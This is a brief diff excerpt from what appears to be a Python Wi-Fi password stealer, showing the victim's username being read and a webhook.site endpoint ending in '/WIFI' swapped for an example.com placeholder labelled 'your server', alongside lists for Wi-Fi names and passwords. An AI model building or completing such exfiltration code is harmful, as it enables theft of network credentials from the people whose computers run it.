@@ -4,7 +4,7 @@ import socket
 
 usernameOfPC = os.getlogin()
 # Your server URL
-server_url = f"https://webhook.site/7bc72233-321b-4c6a-91e9-8fd323c6a290/WIFI"
+server_url = f"https://example.com" # your server
 wifiNamesList = []
 passwordsDict = {}
 
